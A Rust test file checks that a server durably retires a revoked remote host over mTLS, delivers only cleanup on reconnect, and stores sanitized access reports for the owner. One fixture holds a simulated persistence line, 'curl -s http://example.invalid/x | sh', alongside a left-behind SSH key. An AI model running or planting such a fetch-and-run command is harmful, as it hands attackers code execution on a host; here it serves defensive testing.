//! Real mTLS proves durable cleanup replay cannot restore retired host authority.
use super::*;

/// A real enrolled TLS host and the durable server store used to retire it.
struct LoginHost {
    store: EnrollmentStore,
    pool: sqlx::SqlitePool,
    host: Uuid,
    person: Uuid,
    listeners: RemoteListeners,
    observed: tokio::sync::oneshot::Receiver<serde_json::Value>,
    peer: tokio::task::JoinHandle<()>,
    /// Exact enrolled credentials reused to prove cleanup-only reconnect admission.
    config: openssl::ssl::SslConnector,
    /// Exact current leaf, distinct from the expired enrollment fixture record.
    fingerprint: [u8; 32],
}
/// Enroll a real TLS fixture whose initial control channel accepts no grants.
async fn login_host(reply: Option<bool>) -> LoginHost {
    login_host_action(reply, "terminal.login.revoke").await
}
/// Start an enrolled peer that serves one test action and keeps answering probes
/// until the server disconnects it or the test stops it.
/// Retain its exact TLS identity for reconnect proof.
async fn login_host_action(reply: Option<bool>, expected_action: &'static str) -> LoginHost {
    let (server, host_identity, root, _) = identities();
    let (store, pool, host, fingerprint) = admitted_store(&host_identity, &root).await;
    let person = Uuid::new_v4();
    sqlx::query("UPDATE users SET owner=0 WHERE id='owner'")
        .execute(&pool)
        .await
        .unwrap();
    sqlx::query("INSERT INTO users(id,name,username,owner,recovery_hash) VALUES (?,'person','person',1,'test')").bind(person.to_string()).execute(&pool).await.unwrap();
    sqlx::query("UPDATE remote_hosts SET owner_id=? WHERE id=?")
        .bind(person.to_string())
        .bind(host.as_bytes().as_slice())
        .execute(&pool)
        .await
        .unwrap();
    let hosts = RemoteHosts::default();
    let listeners = RemoteListeners::start(
        "127.0.0.1:0".parse().unwrap(),
        &server,
        std::slice::from_ref(&root),
        store.clone(),
        hosts.clone(),
    )
    .await
    .unwrap();
    let address = listeners.local_addr().unwrap();
    let config = remote_tls::client_config(&host_identity, &[root]).unwrap();
    let (seen, observed) = tokio::sync::oneshot::channel();
    let peer_config = config.clone();
    let peer = tokio::spawn(async move {
        let connection = remote_tls::dial(address, "localhost", &peer_config)
            .await
            .unwrap();
        let mut receive = Receive::default();
        let mut transmit = Transmit::default();
        transmit
            .send(
                &connection.channel,
                0,
                &Frame::Hello {
                    version: 1,
                    caps: remote_quic::REMOTE_WRITER_BINDING,
                    client_info: "login-revocation-fixture",
                },
            )
            .await
            .unwrap();
        receive.next(&connection.channel).await.unwrap();
        let mut seen = Some(seen);
        while let Ok(request) = receive.next(&connection.channel).await {
            match request.frame {
                Frame::Ping { nonce, sent_us } => {
                    if transmit
                        .send(&connection.channel, 0, &Frame::Pong { nonce, sent_us })
                        .await
                        .is_err()
                    {
                        break;
                    }
                }
                Frame::Call {
                    call_id,
                    action_id,
                    input_json,
                } => {
                    let Some(seen) = seen.take() else {
                        continue;
                    };
                    assert_eq!(action_id, expected_action);
                    seen.send(serde_json::from_slice(input_json).unwrap())
                        .unwrap();
                    if let Some(revoked) = reply {
                        let json = serde_json::json!({"revoked":revoked}).to_string();
                        let _ = transmit
                            .send(
                                &connection.channel,
                                0,
                                &Frame::Result {
                                    call_id,
                                    ok: true,
                                    json: json.as_bytes(),
                                },
                            )
                            .await;
                    }
                }
                _ => {}
            }
        }
    });
    tokio::time::timeout(Duration::from_secs(3), async {
        loop {
            if hosts.actor(host).await.is_some() {
                break;
            }
            tokio::task::yield_now().await;
        }
    })
    .await
    .unwrap();
    LoginHost {
        store,
        pool,
        host,
        person,
        listeners,
        observed,
        peer,
        config,
        fingerprint,
    }
}

/// Start retirement and wait for its committed denial while retaining its
/// receipt waiter. The test controls reconnect and durability independently.
async fn pending_retirement(
    fixture: &LoginHost,
) -> tokio::task::JoinHandle<Result<(), crate::enrollment::EnrollmentError>> {
    let store = fixture.store.clone();
    let owner = fixture.person.to_string();
    let host = fixture.host;
    let request = tokio::spawn(async move { store.revoke(&owner, host, now().unwrap()).await });
    tokio::time::timeout(Duration::from_secs(10), async {
        loop {
            let pending: bool = sqlx::query_scalar(
                "SELECT EXISTS(SELECT 1 FROM remote_login_cleanup WHERE host_id=? AND confirmed=0)",
            )
            .bind(host.as_bytes().as_slice())
            .fetch_one(&fixture.pool)
            .await
            .unwrap();
            if pending {
                break;
            }
            tokio::task::yield_now().await;
        }
    })
    .await
    .unwrap();
    request
}

/// Persist denial first and complete retirement only after a durable reconnect reply.
#[tokio::test]
async fn authorized_host_revocation_retains_cleanup_after_authority_retirement() {
    let mut fixture = login_host(Some(true)).await;
    assert!(
        fixture
            .store
            .revoke("foreign", fixture.host, now().unwrap())
            .await
            .is_err()
    );
    assert!(
        matches!(
            fixture.observed.try_recv(),
            Err(tokio::sync::oneshot::error::TryRecvError::Empty)
        ),
        "foreign owner caused host cleanup"
    );
    let retirement = pending_retirement(&fixture).await;
    let pending: (String, bool) =
        sqlx::query_as("SELECT person_id,confirmed FROM remote_login_cleanup WHERE host_id=?")
            .bind(fixture.host.as_bytes().as_slice())
            .fetch_one(&fixture.pool)
            .await
            .unwrap();
    assert_eq!(pending, (fixture.person.to_string(), false));
    reconnect_cleanup(&fixture, Some(true)).await;
    retirement.await.unwrap().unwrap();
    let denied: bool =
        sqlx::query_scalar("SELECT revoked_at IS NOT NULL FROM remote_hosts WHERE id=?")
            .bind(fixture.host.as_bytes().as_slice())
            .fetch_one(&fixture.pool)
            .await
            .unwrap();
    assert!(denied);
    fixture.peer.await.unwrap();
    eprintln!("login_cleanup pending_after_retirement=true durable_reconnect_confirmed=true");
}

/// The reports waiting in `owner`'s Inbox (D398).
async fn waiting(fixture: &LoginHost, owner: &str) -> Vec<crate::access_report::Waiting> {
    crate::access_report::inbox(&fixture.pool, owner)
        .await
        .unwrap()
        .reports
}

/// D356, D398: the access report a host returns when its person is revoked
/// (and the host stays) reaches the owner's Inbox through the cleanup outbox.
/// It is kept with the receipt that confirms the revocation, cleaned of
/// terminal escapes, with D353's warning, readable by the host's owner only,
/// and absent until the host confirms.
#[tokio::test]
async fn a_revocation_report_is_kept_with_its_receipt_for_the_owner() {
    let fixture = login_host(None).await;
    let retirement = pending_retirement(&fixture).await;
    let owner = fixture.person.to_string();
    assert!(
        waiting(&fixture, &owner).await.is_empty(),
        "a report existed before the host confirmed"
    );
    let extra = serde_json::json!({
        "warning": "Background programs of this host account may still be running.",
        "access": {"state":"changed","accounts":[{"account":"deploy","state":"changed","files":[
            {"path":"~/.ssh/authorized_keys","change":"changed","lines":["ssh-ed25519 AAAAleft left-behind"]},
            {"path":"~/.bashrc","change":"changed","lines":["curl -s http://example.invalid/x | sh\u{1b}[2J"]},
            {"path":"~/.profile","change":"added","lines":[],"note":"a symbolic link to /etc/passwd; not followed"}
        ],"truncated":false,"unscanned":[],"omitted_files":0}]}
    });
    reconnect_cleanup_reporting(&fixture, Some(true), Some(extra)).await;
    retirement.await.unwrap().unwrap();
    let reports = waiting(&fixture, &owner).await;
    assert_eq!(reports.len(), 1, "the confirmed revocation has no report");
    let (person, report) = (&reports[0].person, &reports[0].report);
    assert_eq!(*person, fixture.person);
    assert_eq!(reports[0].host, fixture.host);
    // This fixture host is rootless: the server, not the host, says the
    // report cannot be vouched for, and keeps the files as hints.
    assert_eq!(report.state, crate::access_report::State::NotChecked);
    assert_eq!(
        report.reason,
        Some(crate::access_report::Reason::RootlessUnverified)
    );
    assert!(report.warning.is_some(), "D353's warning was dropped");
    let account = &report.accounts[0];
    assert_eq!(account.account, "deploy");
    let paths: Vec<&str> = account
        .files
        .iter()
        .map(|file| file.path.as_str())
        .collect();
    assert_eq!(paths, ["~/.ssh/authorized_keys", "~/.bashrc", "~/.profile"]);
    assert_eq!(account.files[0].lines, ["ssh-ed25519 AAAAleft left-behind"]);
    assert_eq!(
        account.files[1].lines,
        ["curl -s http://example.invalid/x | sh\u{fffd}[2J"]
    );
    assert!(
        waiting(&fixture, "owner").await.is_empty(),
        "another account read this host's report"
    );
}

/// J322 P2: an agent older than D356 confirms with no report. The owner
/// reads "not checked: older agent", never "nothing changed".
#[tokio::test]
async fn an_older_agents_revocation_reads_not_checked() {
    let fixture = login_host(None).await;
    let retirement = pending_retirement(&fixture).await;
    reconnect_cleanup(&fixture, Some(true)).await;
    retirement.await.unwrap().unwrap();
    let reports = waiting(&fixture, &fixture.person.to_string()).await;
    assert_eq!(reports.len(), 1, "the confirmed revocation has no report");
    assert_eq!(
        reports[0].report.state,
        crate::access_report::State::NotChecked
    );
    assert_eq!(
        reports[0].report.reason,
        Some(crate::access_report::Reason::RootlessUnverified),
        "a rootless host's report is never vouched for, older agent or not"
    );
}

/// J334 P1-3: on a rootless host the account owns the infraternal agent, so
/// it can answer "unchanged, complete". The server takes the host's mode
/// from its own record and stores `not_checked` with `rootless_unverified`.
#[tokio::test]
async fn a_rootless_host_cannot_claim_unchanged() {
    let fixture = login_host(None).await;
    let retirement = pending_retirement(&fixture).await;
    let forged = serde_json::json!({"access": {"state": "unchanged", "accounts": [{
        "account": "deploy", "state": "unchanged", "files": [], "truncated": false,
        "unscanned": [], "omitted_files": 0, "complete": true, "watched": 999,
        "privileged": false, "shared": false, "programs_may_remain": false,
        "recorded_at": 1, "scanned_at": 2
    }]}});
    reconnect_cleanup_reporting(&fixture, Some(true), Some(forged)).await;
    retirement.await.unwrap().unwrap();
    let reports = waiting(&fixture, &fixture.person.to_string()).await;
    assert_eq!(reports.len(), 1, "the confirmed revocation has no report");
    assert_eq!(
        reports[0].report.state,
        crate::access_report::State::NotChecked
    );
    assert_eq!(
        reports[0].report.accounts[0].reason,
        Some(crate::access_report::Reason::RootlessUnverified)
    );
}

/// Offline cleanup cuts normal authority but cannot complete retirement.
#[tokio::test]
async fn unconfirmed_person_cleanup_does_not_block_host_authority_cut() {
    let fixture = login_host(None).await;
    let retirement = pending_retirement(&fixture).await;
    // Authority retirement closes the old transport; cleanup is delivered on
    // the next authenticated cleanup-only connection from the retained outbox.
    let confirmed: bool =
        sqlx::query_scalar("SELECT confirmed FROM remote_login_cleanup WHERE host_id=?")
            .bind(fixture.host.as_bytes().as_slice())
            .fetch_one(&fixture.pool)
            .await
            .unwrap();
    assert!(!confirmed, "a finite timeout must not confirm durability");
    assert!(
        fixture
            .listeners
            .diagnostic_hosts
            .actor(fixture.host)
            .await
            .is_none()
    );
    assert!(
        !retirement.is_finished(),
        "offline retirement reported success"
    );
    retirement.abort();
    let _ = retirement.await;
    fixture.peer.await.unwrap();
    eprintln!("login_cleanup confirmed=false authority_cut=true retirement_pending=true");
}

/// Preferred host overrides reach an admitted remote actor before any terminal opens.
#[cfg(feature = "ssh")]
#[tokio::test]
async fn connected_remote_host_prepares_its_persons_preferred_account() {
    let fixture = login_host_action(Some(true), "terminal.login.prepare").await;
    let token = "remote-login-preparation-fixture";
    sqlx::query("INSERT INTO sessions(token_hash,user_id,device,expires,fresh,unlocked) VALUES(?,?,'fixture',unixepoch()+60,unixepoch(),1)")
        .bind(crate::auth::hash(token)).bind(fixture.person.to_string()).execute(&fixture.pool).await.unwrap();
    sqlx::query(
        "INSERT INTO preferred_host_accounts(user_id,host_id,account) VALUES(?,?,'deploy')",
    )
    .bind(fixture.person.to_string())
    .bind(fixture.host.as_bytes().as_slice())
    .execute(&fixture.pool)
    .await
    .unwrap();
    let auth = crate::auth::Auth::new(
        fixture.pool.clone(),
        "login.example.test",
        "https://login.example.test",
    )
    .await
    .unwrap();
    let (local, _peer) = tokio::net::UnixStream::pair().unwrap();
    let state = crate::websocket::WebSocketState::new(
        auth,
        fixture.pool.clone(),
        EmbeddedAgent::from_test_socket(local),
    )
    .await
    .unwrap()
    .with_remote_hosts(fixture.listeners.diagnostic_hosts.clone());
    let preparation = tokio::spawn(crate::websocket::prepare_preferred_login(
        Arc::new(state),
        fixture.person.to_string(),
        token.to_owned(),
    ));
    let input = tokio::time::timeout(Duration::from_secs(3), fixture.observed)
        .await
        .unwrap()
        .unwrap();
    assert_eq!(input["person"], fixture.person.to_string());
    assert_eq!(input["account"], "deploy");
    preparation.await.unwrap();
    fixture.peer.abort();
}

/// Wait until the server observes a test peer's disconnect and releases its
/// unique host claim. This fences reconnect ordering without a timing assertion.
async fn cleanup_disconnected(host: Uuid) {
    // A generous deadlock guard, not a response-time assertion. Completion is
    // ordered by the server releasing its host claim after the socket closes.
    tokio::time::timeout(Duration::from_secs(10), async {
        loop {
            let held = crate::remote_runtime::LOGIN_CLEANUPS
                .hosts
                .lock()
                .unwrap()
                .contains(&host);
            if !held {
                return;
            }
            tokio::task::yield_now().await;
        }
    })
    .await
    .expect("disconnected cleanup retained its host claim");
}

/// Reconnect a tombstoned host using its real enrolled mTLS identity. The only
/// admitted request must be the persisted person's cleanup, never a new login.
async fn reconnect_cleanup(fixture: &LoginHost, durable: Option<bool>) {
    reconnect_cleanup_reporting(fixture, durable, None).await;
}

/// [`reconnect_cleanup`] whose durable reply also carries the fields of
/// `extra` (D356's `access` report, D353's `warning`), as a host returns them.
async fn reconnect_cleanup_reporting(
    fixture: &LoginHost,
    durable: Option<bool>,
    extra: Option<serde_json::Value>,
) {
    let connection = remote_tls::dial(
        fixture.listeners.local_addr().unwrap(),
        "localhost",
        &fixture.config,
    )
    .await
    .unwrap();
    let mut receive = Receive::default();
    Transmit::default()
        .send(
            &connection.channel,
            0,
            &Frame::Hello {
                version: 1,
                caps: remote_quic::REMOTE_WRITER_BINDING,
                client_info: "cleanup-reconnect-fixture",
            },
        )
        .await
        .unwrap();
    assert!(matches!(
        receive.next(&connection.channel).await.unwrap().frame,
        Frame::Hello { .. }
    ));
    for _ in 0..if durable == Some(false) { 3 } else { 1 } {
        let request = receive.next(&connection.channel).await.unwrap();
        let Frame::Call {
            call_id,
            action_id,
            input_json,
        } = request.frame
        else {
            panic!("cleanup request missing")
        };
        assert_eq!(action_id, "terminal.login.revoke");
        assert_eq!(
            serde_json::from_slice::<serde_json::Value>(input_json).unwrap(),
            serde_json::json!({"person": fixture.person, "report": true}),
        );
        let Some(durable) = durable else {
            // Dropping the socket after receipt models a lost acknowledgement.
            drop(connection);
            cleanup_disconnected(fixture.host).await;
            return;
        };
        let mut reply = serde_json::json!({"revoked": durable});
        if let Some(serde_json::Value::Object(fields)) = &extra {
            for (name, value) in fields {
                reply[name] = value.clone();
            }
        }
        let json = reply.to_string();
        Transmit::default()
            .send(
                &connection.channel,
                0,
                &Frame::Result {
                    call_id,
                    ok: true,
                    json: json.as_bytes(),
                },
            )
            .await
            .unwrap();
    }
    if durable == Some(false) {
        // Busy replies retain the operation. Disconnect to model a retryable
        // transport loss instead of expecting a finite retry budget to close it.
        drop(connection);
        cleanup_disconnected(fixture.host).await;
        return;
    }
    // Completion closes the private cleanup actor and never publishes it.
    assert!(receive.next(&connection.channel).await.is_err());
}

/// Unconfirmed cleanup survives a server store restart and a refused reply;
/// only a later durable acknowledgement retires it, without restoring authority.
#[tokio::test]
async fn unconfirmed_cleanup_replays_after_restart_without_granting_remote_access() {
    let fixture = login_host(None).await;
    let retirement = pending_retirement(&fixture).await;
    retirement.abort();
    let _ = retirement.await;
    let restarted = EnrollmentStore::new(fixture.pool.clone());
    let fingerprint = fixture.fingerprint;
    assert!(
        AuthorityGuard::admit(restarted.clone(), fingerprint)
            .await
            .is_err()
    );
    let cleanup = AuthorityGuard::admit_transport(restarted.clone(), fingerprint)
        .await
        .unwrap();
    assert_eq!(cleanup.cleanup_person(), Some(fixture.person));
    assert!(cleanup.admit_operation().await.is_err());
    reconnect_cleanup(&fixture, None).await;
    reconnect_cleanup(&fixture, Some(false)).await;
    let confirmed: bool =
        sqlx::query_scalar("SELECT confirmed FROM remote_login_cleanup WHERE host_id=?")
            .bind(fixture.host.as_bytes().as_slice())
            .fetch_one(&fixture.pool)
            .await
            .unwrap();
    assert!(
        !confirmed,
        "a refused reply discarded the server's durable intent"
    );
    reconnect_cleanup(&fixture, Some(true)).await;
    let confirmed: bool =
        sqlx::query_scalar("SELECT confirmed FROM remote_login_cleanup WHERE host_id=?")
            .bind(fixture.host.as_bytes().as_slice())
            .fetch_one(&fixture.pool)
            .await
            .unwrap();
    assert!(confirmed);
    assert!(
        AuthorityGuard::admit_transport(restarted, fingerprint)
            .await
            .is_err()
    );
    assert!(
        fixture
            .listeners
            .diagnostic_hosts
            .actor(fixture.host)
            .await
            .is_none()
    );
    fixture.peer.await.unwrap();
}

/// An authoritative revocation cannot finish retirement before a durable host
/// receipt. Reconnection delivers only cleanup while normal authority stays shut.
#[tokio::test]
async fn retirement_waits_for_durable_acceptance_on_reconnect() {
    let fixture = login_host(None).await;
    let store = fixture.store.clone();
    let owner = fixture.person.to_string();
    let host = fixture.host;
    let mut retirement =
        tokio::spawn(async move { store.revoke(&owner, host, now().unwrap()).await });
    tokio::time::timeout(Duration::from_secs(10), async {
        loop {
            let pending: bool = sqlx::query_scalar(
                "SELECT EXISTS(SELECT 1 FROM remote_login_cleanup WHERE host_id=? AND confirmed=0)",
            )
            .bind(host.as_bytes().as_slice())
            .fetch_one(&fixture.pool)
            .await
            .unwrap();
            if pending {
                break;
            }
            tokio::task::yield_now().await;
        }
    })
    .await
    .unwrap();
    let connection = remote_tls::dial(
        fixture.listeners.local_addr().unwrap(),
        "localhost",
        &fixture.config,
    )
    .await
    .unwrap();
    let mut receive = Receive::default();
    Transmit::default()
        .send(
            &connection.channel,
            0,
            &Frame::Hello {
                version: 1,
                caps: remote_quic::REMOTE_WRITER_BINDING,
                client_info: "durable-retirement-fixture",
            },
        )
        .await
        .unwrap();
    let greeting = receive.next(&connection.channel).await.unwrap();
    assert!(matches!(greeting.frame, Frame::Hello { .. }));
    let request = tokio::select! {
        biased;
        completed = &mut retirement => panic!("retirement completed without a durable agent receipt: {completed:?}"),
        request = receive.next(&connection.channel) => request.unwrap(),
    };
    let Frame::Call {
        call_id,
        action_id: "terminal.login.revoke",
        input_json,
    } = request.frame
    else {
        panic!("cleanup-only reconnect did not deliver the retained refusal");
    };
    assert_eq!(
        serde_json::from_slice::<serde_json::Value>(input_json).unwrap()["person"],
        fixture.person.to_string()
    );
    let retired: bool =
        sqlx::query_scalar("SELECT revoked_at IS NOT NULL FROM remote_hosts WHERE id=?")
            .bind(host.as_bytes().as_slice())
            .fetch_one(&fixture.pool)
            .await
            .unwrap();
    assert!(!retired, "server retired access before durable acceptance");
    Transmit::default()
        .send(
            &connection.channel,
            0,
            &Frame::Result {
                call_id,
                ok: true,
                json: br#"{"revoked":true}"#,
            },
        )
        .await
        .unwrap();
    tokio::time::timeout(Duration::from_secs(10), retirement)
        .await
        .unwrap()
        .unwrap()
        .unwrap();
    let confirmed: bool =
        sqlx::query_scalar("SELECT confirmed FROM remote_login_cleanup WHERE host_id=?")
            .bind(host.as_bytes().as_slice())
            .fetch_one(&fixture.pool)
            .await
            .unwrap();
    assert!(confirmed);
    fixture.peer.await.unwrap();
}

/// A committed pending refusal survives closing every server database connection;
/// reopening must allow cleanup only, without pretending retirement was confirmed.
#[tokio::test]
async fn pending_revocation_survives_database_reopen_before_acceptance() {
    use sqlx::sqlite::{SqliteConnectOptions, SqlitePoolOptions};
    // Test state is independent of Cargo's output directory and the caller's
    // working directory, including direct invocation of the compiled test binary.
    let path = std::env::temp_dir().join(format!("pending-login-{}.sqlite", Uuid::new_v4()));
    let options = SqliteConnectOptions::new()
        .filename(&path)
        .create_if_missing(true);
    let pool = SqlitePoolOptions::new()
        .max_connections(1)
        .connect_with(options.clone())
        .await
        .unwrap();
    let (store, pool, host) = crate::enrollment::authority::tests::enrolled_with_pool(pool).await;
    let person = Uuid::new_v4();
    sqlx::query("UPDATE users SET owner=0 WHERE id='owner'")
        .execute(&pool)
        .await
        .unwrap();
    sqlx::query("INSERT INTO users(id,name,username,owner,recovery_hash) VALUES (?,'person','person',1,'test')")
        .bind(person.to_string()).execute(&pool).await.unwrap();
    sqlx::query("UPDATE remote_hosts SET owner_id=? WHERE id=?")
        .bind(person.to_string())
        .bind(host.as_bytes().as_slice())
        .execute(&pool)
        .await
        .unwrap();
    let owner = person.to_string();
    let pending_store = store.clone();
    let request = tokio::spawn(async move { pending_store.revoke(&owner, host, 101).await });
    tokio::time::timeout(Duration::from_secs(10), async {
        loop {
            let present: bool = sqlx::query_scalar(
                "SELECT EXISTS(SELECT 1 FROM remote_login_cleanup WHERE host_id=? AND confirmed=0)",
            )
            .bind(host.as_bytes().as_slice())
            .fetch_one(&pool)
            .await
            .unwrap();
            if present {
                break;
            }
            tokio::task::yield_now().await;
        }
    })
    .await
    .unwrap();
    request.abort();
    let _ = request.await;
    drop(store);
    pool.close().await;
    let reopened = SqlitePoolOptions::new()
        .max_connections(1)
        .connect_with(options)
        .await
        .unwrap();
    let restarted = EnrollmentStore::new(reopened.clone());
    let retired: bool =
        sqlx::query_scalar("SELECT revoked_at IS NOT NULL FROM remote_hosts WHERE id=?")
            .bind(host.as_bytes().as_slice())
            .fetch_one(&reopened)
            .await
            .unwrap();
    assert!(
        !retired,
        "restart found retirement without durable host acceptance"
    );
    assert!(restarted.admit(&[1; 32], 101).await.is_err());
    let (_, cleanup_person) = restarted.admit_cleanup(&[1; 32], 101).await.unwrap();
    assert_eq!(cleanup_person, person);
    restarted.confirm_login_cleanup(host, person).await.unwrap();
    let confirmed: bool =
        sqlx::query_scalar("SELECT confirmed FROM remote_login_cleanup WHERE host_id=?")
            .bind(host.as_bytes().as_slice())
            .fetch_one(&reopened)
            .await
            .unwrap();
    assert!(confirmed);
    drop(restarted);
    reopened.close().await;
    std::fs::remove_file(path).unwrap();
}

/// Queued cleanup must not consume the reserve used by ordinary reconnects.
/// Count actual owned permits instead of relying on handshake response timing.
#[tokio::test]
async fn cleanup_delivery_returns_handshake_admission_before_waiting() {
    let fixture = login_host(None).await;
    let normal = AuthorityGuard::admit(fixture.store.clone(), fixture.fingerprint)
        .await
        .unwrap();
    let retirement = pending_retirement(&fixture).await;
    let cleanup = AuthorityGuard::admit_transport(fixture.store.clone(), fixture.fingerprint)
        .await
        .unwrap();
    for authority in [normal, cleanup] {
        let is_cleanup = authority.cleanup_person().is_some();
        let slots = Arc::new(tokio::sync::Semaphore::new(2));
        let permits = (
            slots.clone().acquire_owned().await.unwrap(),
            slots.clone().acquire_owned().await.unwrap(),
        );
        let mut admission =
            crate::remote_standby::Admission::new(authority, permits, Arc::default());
        assert_eq!(slots.available_permits(), 0);
        admission.release_cleanup_handshake();
        assert_eq!(
            slots.available_permits(),
            if is_cleanup { 2 } else { 0 },
            "cleanup retained normal handshake admission"
        );
    }
    retirement.abort();
    let _ = retirement.await;
    fixture.peer.abort();
}

/// Refused default removals must not send even the preliminary host revoke.
#[tokio::test]
async fn refused_removal_leaves_the_connected_host_untouched() {
    for refusal in [
        "session",
        "expired_session",
        "window",
        "revoked_key",
        "key_scope",
    ] {
        let mut fixture = login_host(Some(true)).await;
        let now = crate::runtime::unix_seconds().unwrap();
        let token = "j347-removal-session";
        let hash = crate::auth::hash(token);
        sqlx::query("INSERT INTO sessions(token_hash,user_id,device,expires,fresh,unlocked) VALUES(?,?,'fixture',?,?,1)")
            .bind(&hash).bind(fixture.person.to_string()).bind(now + 3600).bind(now).execute(&fixture.pool).await.unwrap();
        let auth = crate::auth::Auth::new(
            fixture.pool.clone(),
            "removal.example.test",
            "https://removal.example.test",
        )
        .await
        .unwrap();
        let removal = crate::remote_removal::Removal::new(
            auth,
            fixture.pool.clone(),
            fixture.store.clone(),
            fixture.listeners.diagnostic_hosts.clone(),
            std::path::PathBuf::new(),
        );
        let result = if matches!(refusal, "session" | "expired_session" | "window") {
            let review = removal.start(token, fixture.host, true, now).await.unwrap();
            let sql = if refusal == "session" {
                "DELETE FROM sessions WHERE token_hash=?"
            } else if refusal == "expired_session" {
                "UPDATE sessions SET expires=1 WHERE token_hash=?"
            } else {
                "UPDATE sessions SET fresh=1 WHERE token_hash=?"
            };
            sqlx::query(sql)
                .bind(&hash)
                .execute(&fixture.pool)
                .await
                .unwrap();
            removal
                .finish_host(token, fixture.host, review["review"].as_str().unwrap(), now)
                .await
        } else {
            let (scopes, dead) = if refusal == "revoked_key" {
                ("[\"hosts:write\"]", 1)
            } else {
                ("[\"hosts:read\"]", 0)
            };
            sqlx::query("INSERT INTO api_keys(token_hash,user_id,device,scopes,renewed_at,expires_at,dead) VALUES(?,?,'fixture',?,?,?,?)")
                .bind(&hash).bind(fixture.person.to_string()).bind(scopes).bind(now).bind(now + 3600).bind(dead).execute(&fixture.pool).await.unwrap();
            removal
                .remove_with_key(&hash, &fixture.person.to_string(), fixture.host, 0, now)
                .await
        };
        assert!(result.is_err(), "{refusal} removal was accepted");
        assert!(
            matches!(
                fixture.observed.try_recv(),
                Err(tokio::sync::oneshot::error::TryRecvError::Empty)
            ),
            "{refusal} sent a host revoke before refusing removal"
        );
        let pending: i64 =
            sqlx::query_scalar("SELECT count(*) FROM remote_host_removals WHERE host_id=?")
                .bind(fixture.host.as_bytes().as_slice())
                .fetch_one(&fixture.pool)
                .await
                .unwrap();
        assert_eq!(pending, 0);
        fixture.peer.abort();
        let _ = fixture.peer.await;
    }
}
